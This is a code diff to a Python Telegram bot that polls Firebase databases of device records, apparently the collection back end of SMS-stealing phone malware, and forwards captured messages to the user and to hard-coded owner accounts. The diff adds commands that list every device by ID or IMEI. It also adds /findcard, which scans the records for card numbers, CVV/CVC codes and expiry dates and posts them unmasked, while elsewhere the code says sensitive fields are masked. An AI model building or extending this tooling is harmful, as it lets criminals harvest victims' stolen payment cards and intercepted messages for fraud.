@@ -35,6 +35,15 @@ cache_time = {}       # chat_id -> last refresh timestamp
 CACHE_REFRESH_SECONDS = 3600  # 1 hour
 
 
+muted_devices = set()
+
+CARD_KEYS = {
+    "card", "cardnumber", "cc",
+    "cvv", "cvc",
+    "expiry", "exp", "mm", "yy"
+}
+
+
 # ---------- UTILITY FUNCTIONS ----------
 def normalize_json_url(url):
     if not url:
@@ -219,58 +228,20 @@ def format_notification(fields, user_id):
 
 
 def notify_user_owner(chat_id, fields):
+    device_id = str(fields.get('device', '')).strip()
+    if device_id in muted_devices:
+        return
     text = format_notification(fields, chat_id)
     send_msg(chat_id, text)
     send_msg(OWNER_IDS, text)
 
 
 # ---------- SSE WATCHER ----------
+
 def sse_loop(chat_id, base_url):
-    url = base_url.rstrip("/")
-    if not url.endswith(".json"):
-        url = url + "/.json"
-    stream_url = url + "?print=silent"
-    seen = seen_hashes.setdefault(chat_id, set())
-    send_msg(chat_id, "⚡ SSE (live) started. Auto-reconnect enabled.")
-    retries = 0
-    while firebase_urls.get(chat_id) == base_url:
-        try:
-            client = SSEClient(stream_url)
-            for event in client.events():
-                if firebase_urls.get(chat_id) != base_url:
-                    break
-                if not event.data or event.data == "null":
-                    continue
-                try:
-                    data = json.loads(event.data)
-                except Exception:
-                    continue
-                payload = (
-                    data.get("data")
-                    if isinstance(data, dict) and "data" in data
-                    else data
-                )
-                nodes = find_sms_nodes(payload, "")
-                for path, obj in nodes:
-                    h = compute_hash(path, obj)
-                    if h in seen:
-                        continue
-                    seen.add(h)
-                    fields = extract_fields(obj)
-                    notify_user_owner(chat_id, fields)
-            retries = 0
-        except Exception as e:
-            print(f"SSE error ({chat_id}):", e)
-            retries += 1
-            if retries >= MAX_SSE_RETRIES:
-                send_msg(
-                    chat_id,
-                    "⚠️ SSE failed multiple times, falling back to polling...",
-                )
-                poll_loop(chat_id, base_url)
-                break
-            backoff = min(30, 2 ** retries)
-            time.sleep(backoff)
+    # SSE disabled for stability. Using polling only.
+    poll_loop(chat_id, base_url)
+
 
 
 # ---------- POLLING FALLBACK ----------
@@ -444,6 +415,61 @@ def safe_format_device_record(rec: dict) -> str:
     lines.append("⚠️ Highly sensitive fields are masked for security.")
     return "\n".join(lines)
 
+
+
+def collect_all_devices(snapshot, devices=None):
+    if devices is None:
+        devices = set()
+    if isinstance(snapshot, dict):
+        for v in snapshot.values():
+            if isinstance(v, dict):
+                d = (
+                    v.get("device")
+                    or v.get("deviceId")
+                    or v.get("device_id")
+                    or v.get("imei")
+                )
+                if d:
+                    devices.add(str(d))
+            if isinstance(v, (dict, list)):
+                collect_all_devices(v, devices)
+    elif isinstance(snapshot, list):
+        for v in snapshot:
+            collect_all_devices(v, devices)
+    return devices
+
+
+def has_card_data(obj):
+    if not isinstance(obj, dict):
+        return False
+    for k, v in obj.items():
+        if str(k).lower() in CARD_KEYS and v:
+            return True
+        if isinstance(v, dict) and has_card_data(v):
+            return True
+    return False
+
+
+def collect_card_devices(snapshot, result=None):
+    if result is None:
+        result = {}
+    if isinstance(snapshot, dict):
+        for v in snapshot.values():
+            if isinstance(v, dict):
+                d = (
+                    v.get("device")
+                    or v.get("deviceId")
+                    or v.get("device_id")
+                    or v.get("imei")
+                )
+                if d and has_card_data(v):
+                    result.setdefault(str(d), []).append(v)
+            if isinstance(v, (dict, list)):
+                collect_card_devices(v, result)
+    elif isinstance(snapshot, list):
+        for v in snapshot:
+            collect_card_devices(v, result)
+    return result
 
 # ---------- CACHE FUNCTIONS ----------
 def refresh_firebase_cache(chat_id):
@@ -646,7 +672,64 @@ def handle_update(u):
         )
         return
 
-    # -------- /find <device_id> (safe) --------
+    
+    # -------- DEVICE MUTE --------
+    if lower_text.startswith("/mute"):
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            send_msg(chat_id, "Usage: <code>/mute device_id</code>")
+            return
+        muted_devices.add(parts[1].strip())
+        send_msg(chat_id, f"🔕 Muted device: <code>{html.escape(parts[1])}</code>")
+        return
+
+    if lower_text.startswith("/unmute"):
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            send_msg(chat_id, "Usage: <code>/unmute device_id</code>")
+            return
+        muted_devices.discard(parts[1].strip())
+        send_msg(chat_id, f"🔔 Unmuted device: <code>{html.escape(parts[1])}</code>")
+        return
+
+    # -------- ALL DEVICES --------
+    if lower_text == "/alldevices":
+        base_url = firebase_urls.get(chat_id)
+        if not base_url:
+            send_msg(chat_id, "❌ No active Firebase URL.")
+            return
+        snap = http_get_json(normalize_json_url(base_url))
+        devices = collect_all_devices(snap)
+        if not devices:
+            send_msg(chat_id, "ℹ️ No devices found.")
+            return
+        msg = "📱 <b>All Devices</b>\n\n" + "\n".join(f"• <code>{html.escape(d)}</code>" for d in sorted(devices))
+        send_msg(chat_id, msg)
+        return
+
+    # -------- FIND CARD --------
+    if lower_text == "/findcard":
+        base_url = firebase_urls.get(chat_id)
+        if not base_url:
+            send_msg(chat_id, "❌ No active Firebase URL.")
+            return
+        snap = http_get_json(normalize_json_url(base_url))
+        devices = collect_card_devices(snap)
+        if not devices:
+            send_msg(chat_id, "ℹ️ No card data found.")
+            return
+        out = "💳 <b>Devices with Card Data</b>\n\n"
+        for d, recs in devices.items():
+            out += f"📱 <code>{html.escape(d)}</code>\n"
+            rec = recs[-1]
+            for k, v in rec.items():
+                if str(k).lower() in CARD_KEYS:
+                    out += f"  • <b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>\n"
+            out += "\n"
+        send_msg(chat_id, out)
+        return
+
+# -------- /find <device_id> (safe) --------
     if lower_text.startswith("/find"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2 or not parts[1].strip():
